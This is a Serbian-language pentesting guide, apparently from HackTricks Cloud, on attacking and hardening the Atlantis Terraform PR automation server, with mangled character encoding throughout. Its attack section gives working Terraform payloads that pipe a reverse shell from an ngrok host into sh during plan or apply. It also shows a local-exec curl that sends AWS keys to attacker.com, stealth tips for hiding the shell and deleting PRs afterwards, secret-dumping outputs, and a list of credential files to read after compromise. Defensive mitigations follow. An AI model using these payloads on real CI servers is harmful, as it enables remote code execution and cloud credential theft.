# Bezbednost Atlantisa

<details>

{% hint style="success" %}
Nau캜ite i ve쬭ajte hakovanje AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Obuka AWS Crveni Tim Ekspert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Nau캜ite i ve쬭ajte hakovanje GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Obuka GCP Crveni Tim Ekspert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr쬴te HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## Osnovne informacije

Atlantis vam u osnovi poma쬰 da pokrenete terraform iz Pull zahteva sa va코eg git servera.

![](<../.gitbook/assets/image (161).png>)

## Lokalni Lab

1. Idite na **stranicu izdanja Atlantisa** na [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) i **preuzmite** onaj koji vam odgovara.
2. Kreirajte **li캜ni token** (sa pristupom repozitorijumu) va코eg **github** korisnika
3. Izvr코ite `./atlantis testdrive` i on 캖e kreirati **demo repozitorijum** koji mo쬰te koristiti da **komunicirate sa atlantisom**
1. Mo쬰te pristupiti web stranici na 127.0.0.1:4141

## Pristup Atlantisu

### Krediti Git Servera

**Atlantis** podr쬬va nekoliko git doma캖ina kao 코to su **Github**, **Gitlab**, **Bitbucket** i **Azure DevOps**.\
Me캠utim, da bi pristupao repozitorijumima na tim platformama i obavljao akcije, potrebno je da imaju neki **dodeljen privilegovan pristup** (barem dozvole za pisanje).\
[Dokumentacija](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional) podsti캜e da kreirate korisnika na ovim platformama specifi캜no za Atlantisa, ali neki ljudi mogu koristiti li캜ne naloge.

{% hint style="warning" %}
U svakom slu캜aju, sa perspektive napada캜a, **Atlantis nalog** 캖e biti veoma **interesantan za kompromitovanje**.
{% endhint %}

### Webhookovi

Atlantis opciono koristi [**Webhook tajne**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret) da validira da li su **webhookovi** koje prima od va코eg Git doma캖ina **legitimni**.

Jedan na캜in da se to potvrdi je da se **dozvole zahteve samo da dolaze sa IP adresa** va코eg Git doma캖ina, ali jednostavniji na캜in je kori코캖enje Webhook Tajne.

Imajte na umu da osim ako koristite privatni github ili bitbucket server, mora캖ete da izlo쬴te krajnje ta캜ke webhooka internetu.

{% hint style="warning" %}
Atlantis 캖e **izlagati webhookove** tako da git server mo쬰 slati informacije. Sa perspektive napada캜a bilo bi interesantno znati **da li mo쬰te slati poruke**.
{% endhint %}

### Krediti Provajdera <a href="#provider-credentials" id="provider-credentials"></a>

[Od dokumentacije:](https://www.runatlantis.io/docs/provider-credentials.html)

Atlantis pokre캖e Terraform jednostavno **izvr코avanjem `terraform plan` i `apply`** komandi na serveru **na kome je hostovan Atlantis**. Ba코 kao kada pokre캖ete Terraform lokalno, Atlantisu su potrebni krediti za va코 specifi캜an provajder.

Na vama je kako 캖ete [dostaviti kredite](https://www.runatlantis.io/docs/provider-credentials.html#aws-specific-info) za va코 specifi캜an provajder Atlantisu:

* Atlantis [Helm Chart](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) i [AWS Fargate Modul](https://www.runatlantis.io/docs/deployment.html#aws-fargate) imaju svoje mehanizme za kredite provajdera. Pro캜itajte njihovu dokumentaciju.
* Ako pokre캖ete Atlantisa u oblaku, mnogi oblaci imaju na캜ine da daju pristup cloud API-ju aplikacijama koje se izvr코avaju na njima, npr:
* [AWS EC2 Uloge](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) (Pretra쬴te "EC2 Uloga")
* [GCE Instance Servisni Nalozi](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)
* Mnogi korisnici postavljaju okru쬹e promenljive, npr. `AWS_ACCESS_KEY`, gde se Atlants izvr코ava.
* Drugi kreiraju neophodne konfiguracione fajlove, npr. `~/.aws/credentials`, gde se Atlants izvr코ava.
* Koristite [HashiCorp Vault Provajder](https://registry.terraform.io/providers/hashicorp/vault/latest/docs) da dobijete kredite provajdera.

{% hint style="warning" %}
**Kontejner** u kome **Atlantis** **radi** 캖e verovatno **sadr쬬ti privilegovane kredite** za provajdere (AWS, GCP, Github...) koje Atlantis upravlja putem Terraforma.
{% endhint %}

### Web Stranica

Podrazumevano, Atlantis 캖e pokrenuti **web stranicu na portu 4141 na localhostu**. Ova stranica vam omogu캖ava da omogu캖ite/onemogu캖ite atlantis apply i proverite status plana repozitorijuma i otklju캜ate ih (ne dozvoljava modifikacije, pa nije toliko korisna).

Verovatno je ne캖ete na캖i izlo쬰nu internetu, ali izgleda da podrazumevano **nije potrebno korisni캜ko ime i lozinka** za pristup (a ako jesu, `atlantis`:`atlantis` su **podrazumevani**).

## Konfiguracija Servera

Konfiguracija za `atlantis server` mo쬰 se specificirati putem zastavica komandne linije, okru쬹ih promenljivih, konfiguracionog fajla ili kombinacijom ova tri.

* Mo쬰te prona캖i [**ovde listu zastavica**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration) podr쬬nih od strane Atlantisa servera
* Mo쬰te prona캖i [**ovde kako transformisati opciju konfiguracije u okru쬹u promenljivu**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables)

Vrednosti se **biraju po ovom redosledu**:

1. Zastavice
2. Okru쬹e Promenljive
3. Konfiguracioni Fajl

{% hint style="warning" %}
Imajte na umu da u konfiguraciji mo쬰te prona캖i interesantne vrednosti kao 코to su **tokeni i lozinke**.
{% endhint %}

### Konfiguracija Repozitorijuma

Neke konfiguracije uti캜u na **na캜in upravljanja repozitorijumima**. Me캠utim, mogu캖e je da **svaki repozitorijum zahteva razli캜ite postavke**, pa postoje na캜ini da se specificira svaki repozitorijum. Ovo je prioritetni redosled:

1. Repozitorijum [**`/atlantis.yml`**](https://www.runatlantis.io/docs/repo-level-atlantis-yaml.html#repo-level-atlantis-yaml-config) fajl. Ovaj fajl se mo쬰 koristiti da se specificira kako atlantis treba da tretira repozitorijum. Me캠utim, podrazumevano neke klju캜ne vrednosti ne mogu biti specificirane ovde bez odre캠enih zastavica koje to omogu캖avaju.
1. Verovatno je potrebno dozvoliti ih zastavicama poput `allowed_overrides` ili `allow_custom_workflows`
2. [**Konfiguracija na Serveru**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config): Mo쬰te je proslediti zastavicom `--repo-config` i to je yaml koji konfiguri코e nove postavke za svaki repozitorijum (podr쬬ni su regexi)
3. **Podrazumevane** vrednosti
#### Za코tita PR-a

Atlantis omogu캖ava da nazna캜ite da li 쬰lite da **PR** odobri neko drugi (캜ak i ako to nije postavljeno u za코titi grane) i/ili da bude **`spojiv`** (za코tita grane je pro코la) **pre pokretanja primene**. Sa aspekta bezbednosti, preporu캜ljivo je postaviti oba opcije.

U slu캜aju da je `allowed_overrides` True, ova pode코avanja mogu biti **prepisana na svakom projektu putem fajla `/atlantis.yml`**.

#### Skripte

Konfiguracija repozitorijuma mo쬰 **specificirati skripte** koje 캖e se izvr코iti [**pre**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage) (_pre workflow hooks_) i [**posle**](https://www.runatlantis.io/docs/post-workflow-hooks.html) (_post workflow hooks_) izvr코enja **workflow-a**.

Ne postoji opcija da se **specificiraju** ove skripte u **repozitorijumskom fajlu `/atlantis.yml`**.

#### Workflow

U konfiguraciji repozitorijuma (konfiguracija na serverskoj strani) mo쬰te [**specificirati novi podrazumevani workflow**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow), ili [**kreirati nove prilago캠ene workflow-e**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)**.** Tako캠e mo쬰te **specificirati** koje **repozitorijume** mogu **pristupiti** novim generisanim.

Zatim, mo쬰te dozvoliti fajlu **atlantis.yaml** svakog repozitorijuma da **specificira workflow koji 캖e se koristiti**.

{% hint style="danger" %}
Ako je zastava [**konfiguracije na serverskoj strani**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allow_custom_workflows` postavljena na **True**, workflow-i mogu biti **specificirani** u **`atlantis.yaml`** fajlu svakog repozitorijuma. Potencijalno je tako캠e potrebno da **`allowed_overrides`** tako캠e specificira **`workflow`** da bi **prepisao workflow** koji 캖e biti kori코캖en.\
Ovo 캖e u osnovi omogu캖iti **RCE na Atlantis serveru svakom korisniku koji mo쬰 pristupiti tom repozitorijumu**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### Provera politike Conftest

Atlantis podr쬬va pokretanje **server-side** [**conftest**](https://www.conftest.dev/) **polisa** protiv izlaza plana. Uobi캜ajene upotrebe za kori코캖enje ovog koraka uklju캜uju:

* Odbijanje kori코캖enja liste modula
* Tvrdnja atributa resursa prilikom kreiranja
* Otkrivanje nenamernih brisanja resursa
* Prevencija sigurnosnih rizika (tj. izlaganje sigurnih portova javnosti)

Mo쬰te proveriti kako da ga konfiguri코ete u [**dokumentaciji**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works).

## Atlantis Komande

[U dokumentaciji](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis) mo쬰te prona캖i opcije koje mo쬰te koristiti za pokretanje Atlantisa:
```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```
## Napadi

{% hint style="warning" %}
Ako tokom eksploatacije nai캠ete na ovu **gre코ku**: `Error: Error acquiring the state lock`

Mo쬰te je popraviti pokretanjem:
```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

### Atlantis plan RCE - Izmena konfiguracije u novom PR-u

Ako imate pristup za pisanje nad repozitorijumom, bi캖ete u mogu캖nosti da napravite novu granu na njemu i generi코ete PR. Ako mo쬰te **izvr코iti `atlantis plan`** (ili mo쬯a se automatski izvr코ava) **bi캖ete u mogu캖nosti da izvr코ite udaljeni kod unutar Atlantis servera**.

To mo쬰te uraditi tako 코to 캖ete [**naterati Atlantisa da u캜ita spoljni izvor podataka**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source). Samo ubacite payload poput slede캖eg u fajl `main.tf`:
```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Skriveniji napad

Ovaj napad mo쬰te izvesti 캜ak i na **skriveniji na캜in**, prate캖i ove sugestije:

* Umesto dodavanja reverznog 코ella direktno u terraform fajl, mo쬰te **u캜itati spoljni resurs** koji sadr쬴 reverzni 코el:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Mo쬰te prona캖i rev shell kod na [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* U spoljnom resursu, koristite **ref** funkciju da sakrijete **terraform rev shell kod u grani** unutar repozitorijuma, ne코to poput: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* **Umesto** kreiranja **PR-a ka masteru** da biste pokrenuli Atlantis, **napravite 2 grane** (test1 i test2) i napravite **PR sa jedne na drugu**. Kada zavr코ite napad, jednostavno **uklonite PR i grane**.

### Atlantis plan Dump Tajni

Mo쬰te **izvu캖i tajne kori코캖ene od strane terraforma** pokretanjem `atlantis plan` (`terraform plan`) ubacivanjem ne캜ega poput ovoga u terraform fajl:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
### Atlantis primenjuje RCE - Izmena konfiguracije u novom PR-u

Ako imate pristup za pisanje nad repozitorijumom, mo캖i 캖ete da napravite novu granu na njemu i generi코ete PR. Ako mo쬰te **izvr코iti `atlantis apply` mo캖i 캖ete da izvr코ite RCE unutar Atlantisa servera**.

Me캠utim, obi캜no 캖ete morati da zaobi캠ete neka za코titna pode코avanja:

* **Spojivo**: Ako je ova za코tita postavljena u Atlantisu, mo쬰te pokrenuti **`atlantis apply` samo ako je PR spojiv** (코to zna캜i da za코tita grane mora biti zaobi캠ena).
* Proverite potencijalne [**zaobilaske za코tite grane**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)
* **Odobreno**: Ako je ova za코tita postavljena u Atlantisu, **neki drugi korisnik mora odobriti PR** pre nego 코to mo쬰te pokrenuti `atlantis apply`
* Podrazumevano mo쬰te zloupotrebiti [**Gitbot token da biste zaobi코li ovu za코titu**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)

Pokretanje **`terraform apply` na zlonamerni Terraform fajl sa** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Samo se pobrinite da neki payload poput slede캖ih zavr코i u fajlu `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Pratite **preporuke iz prethodne tehnike** kako biste izvr코ili ovaj napad na **diskretniji na캜in**.

### Umetanje Terraform parametara

Prilikom pokretanja `atlantis plan` ili `atlantis apply`, terraform se pokre캖e ispod, mo쬰te proslediti komande terraformu iz atlantisa komentari코u캖i ne코to poput:
```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```
Ne코to 코to mo쬰te proslediti su env promenljive koje mogu biti korisne za zaobila쬰nje nekih za코tita. Proverite terraform env vars na [https://www.terraform.io/cli/config/environment-variables](https://www.terraform.io/cli/config/environment-variables)

### Prilago캠eni Radni Tok

Pokretanje **zlonamernih prilago캠enih naredbi za izgradnju** navedenih u datoteci `atlantis.yaml`. Atlantis koristi datoteku `atlantis.yaml` sa grane zahteva za povla캜enje, **ne** sa `master` grane.\
Ova mogu캖nost je pomenuta u prethodnom odeljku:

{% hint style="danger" %}
Ako je zastava [**konfiguracija na serverskoj strani**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) postavljena na **True**, radni tokovi mogu biti **navedeni** u datoteci **`atlantis.yaml`** svakog repozitorijuma. Potencijalno je tako캠e potrebno da **`allowed_overrides`** tako캠e specificira i **`workflow`** da bi se **zamenio radni tok** koji 캖e biti kori코캖en.

Ovo 캖e u osnovi omogu캖iti **RCE na Atlantis serveru bilo kom korisniku koji mo쬰 pristupiti tom repozitorijumu**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

### Zaobila쬰nje za코tite planiranja/primene

Ako je zastava [**konfiguracija sa serverske strane**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allowed_overrides` _konfigurisana_ sa `apply_requirements`, mogu캖e je da repozitorijum **izmeni za코titu planiranja/primene kako bi je zaobi코ao**.
```yaml
repos:
- id: /.*/
apply_requirements: []
```
### PR Preuzimanje identiteta

Ako neko po코alje **`atlantis plan/apply` komentare na va코e validne zahteve za povla캜enje,** to 캖e uzrokovati da se terraform pokrene kada to ne 쬰lite.

Osim toga, ako nemate konfigurisano u **za코titi grane** da zatra쬴te **ponovno procenjivanje** svakog zahteva za povla캜enje kada se **doda novi commit** na nju, neko bi mogao **napisati zlonamerne konfiguracije** (proverite prethodne scenarije) u terraform konfiguraciji, pokrenuti `atlantis plan/apply` i dobiti RCE.

Ovo je **postavka** u Github za코titi grane:

![](<../.gitbook/assets/image (216).png>)

### Tajna Webhook-a

Ako uspete da **ukradete tajnu webhook-a** koja se koristi ili ako se **ne koristi nikakva tajna webhook-a**, mogli biste **pozvati Atlantis webhook** i **izvr코iti atlantis komande** direktno.

### Bitbucket

Bitbucket Cloud **ne podr쬬va tajne webhook-a**. To bi moglo omogu캖iti napada캜ima da **falsifikuju zahteve sa Bitbucket-a**. Proverite da li dozvoljavate samo IP adrese Bitbucket-a.

* To zna캜i da bi **napada캜** mogao poslati **la쬹e zahteve Atlantisu** koji izgledaju kao da dolaze sa Bitbucket-a.
* Ako specificirate `--repo-allowlist` onda bi mogli samo da la쬴raju zahteve koji se odnose na te repozitorijume, tako da bi najve캖a 코teta koju bi mogli da naprave bila da planiraju/primene na va코im sopstvenim repozitorijumima.
* Da biste to spre캜ili, dozvolite [IP adrese Bitbucket-a](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html) (vidi Izlazne IPv4 adrese).

## Post-Eksploatacija

Ako ste uspeli da pristupite serveru ili ste barem dobili LFI, postoje neke zanimljive stvari koje biste trebali poku코ati pro캜itati:

* `/home/atlantis/.git-credentials` Sadr쬴 pristupne podatke za vcs
* `/atlantis-data/atlantis.db` Sadr쬴 pristupne podatke za vcs sa vi코e informacija
* `/atlantis-data/repos/<org_name>`_`/`_`<repo_name>/<pr_num>/<workspace>/<path_to_dir>/.terraform/terraform.tfstate` Terraform stanje datoteke
* Primer: /atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` Env promenljive
* `/proc/[2-20]/cmdline` Komandna linija `atlantis server` (mo쬰 sadr쬬ti osetljive podatke)

## Otklanjanje

### Ne Koristite Na Javnim Repozitorijumima <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

Zato 코to bilo ko mo쬰 komentarisati javne zahteve za povla캜enje, 캜ak i sa svim dostupnim sigurnosnim merama, i dalje je opasno pokretati Atlantis na javnim repozitorijumima bez odgovaraju캖e konfiguracije sigurnosnih postavki.

### Ne Koristite `--allow-fork-prs` <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

Ako radite na javnom repozitorijumu (코to se ne preporu캜uje, vidi gore) ne biste trebali postaviti `--allow-fork-prs` (podrazumevano je false) jer bilo ko mo쬰 otvoriti zahtev za povla캜enje sa svog forka ka va코em repozitorijumu.

### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

Atlantis zahteva da specificirate listu dozvoljenih repozitorijuma sa kojih 캖e prihvatati webhook-ove putem `--repo-allowlist` zastave. Na primer:

* Specifi캜ni repozitorijumi: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* Ceo va코a organizacija: `--repo-allowlist=github.com/runatlantis/*`
* Svi repozitorijumi u va코oj GitHub Enterprise instalaciji: `--repo-allowlist=github.yourcompany.com/*`
* Svi repozitorijumi: `--repo-allowlist=*`. Korisno kada ste u za코ti캖enoj mre쬴, ali opasno bez postavljanja tajne webhook-a.

Ova zastava osigurava da va코a instalacija Atlantisa nije kori코캖ena sa repozitorijumima koje ne kontroli코ete. Pogledajte `atlantis server --help` za vi코e detalja.

### Za코tita Terraform Planiranja <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

Ako su napadi koji podnose zahteve za povla캜enje sa zlonamernim Terraform kodom u va코em modelu pretnje, morate biti svesni da odobrenja za `terraform apply` nisu dovoljna. Mogu캖e je pokrenuti zlonamerni kod u `terraform plan` koriste캖i [`external` data source](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) ili specificiranjem zlonamernog provajdera. Taj kod bi mogao da ekstraktuje va코e akreditive.

Da biste to spre캜ili, mo쬰te:

1. Ugraditi provajdere u sliku Atlantisa ili host i zabraniti izlaz u produkciji.
2. Implementirati protokol registra provajdera interno i zabraniti javni izlaz, na taj na캜in kontroli코ete ko ima pristup za pisanje u registar.
3. Modifikujte [konfiguraciju repozitorijuma na serverskoj strani](https://www.runatlantis.io/docs/server-side-repo-config.html) `plan` korak da validira protiv kori코캖enja zabranjenih provajdera ili data izvora ili PR-ova od korisnika koji nisu dozvoljeni. Tako캠e mo쬰te dodati dodatnu validaciju u ovom trenutku, npr. zahtevaju캖i "thumbs-up" na PR pre nego 코to dozvolite nastavak `plan`-a. Conftest bi mogao biti od koristi ovde.

### Tajne Webhook-a <a href="#webhook-secrets" id="webhook-secrets"></a>

Atlantis bi trebalo pokrenuti sa postavljenim tajnama webhook-a putem `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET` okru쬰njskih promenljivih. 캛ak i sa postavljenom `--repo-allowlist` zastavom, bez tajne webhook-a, napada캜i bi mogli poslati zahteve Atlantisu predstavljaju캖i se kao repozitorijum koji je na listi dozvoljenih. Tajne webhook-a osiguravaju da zahtevi webhook-a zaista dolaze od va코eg VCS provajdera (GitHub ili GitLab).

Ako koristite Azure DevOps, umesto tajni webhook-a dodajte osnovno korisni캜ko ime i lozinku.

### Osnovna Autentikacija Azure DevOps-a <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

Azure DevOps podr쬬va slanje osnovnog autentikacionog zaglavlja u svim webhook doga캠ajima. Ovo zahteva kori코캖enje HTTPS URL-a za lokaciju va코eg webhook-a.

### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

Ako koristite tajne webhook-a, ali je va코 saobra캖aj preko HTTP-a, tajne webhook-a mogu biti ukradene. Omogu캖ite SSL/HTTPS kori코캖enjem `--ssl-cert-file` i `--ssl-key-file` zastava.

### Omogu캖ite Autentikaciju na Atlantis Web Serveru <a href="#enable-authentication-on-atlantis-web-server" id="enable-authentication-on-atlantis-web-server"></a>

Veoma je preporu캜ljivo omogu캖iti autentikaciju na web servisu. Omogu캖ite BasicAuth kori코캖enjem `--web-basic-auth=true` i postavite korisni캜ko ime i lozinku kori코캖enjem `--web-username=yourUsername` i `--web-password=yourPassword` zastava.

Tako캠e mo쬰te proslediti ove vrednosti kao okru쬰njske promenljive `ATLANTIS_WEB_BASIC_AUTH=true` `ATLANTIS_WEB_USERNAME=yourUsername` i `ATLANTIS_WEB_PASSWORD=yourPassword`.

## Reference

* [**https://www.runatlantis.io/docs**](https://www.runatlantis.io/docs)
* [**https://www.runatlantis.io/docs/provider-credentials.html**](https://www.runatlantis.io/docs/provider-credentials.html)

<details>

{% hint style="success" %}
Nau캜ite i ve쬭ajte hakovanje AWS-a:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Nau캜ite i ve쬭ajte hakovanje GCP-a: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr쬴te HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili **telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
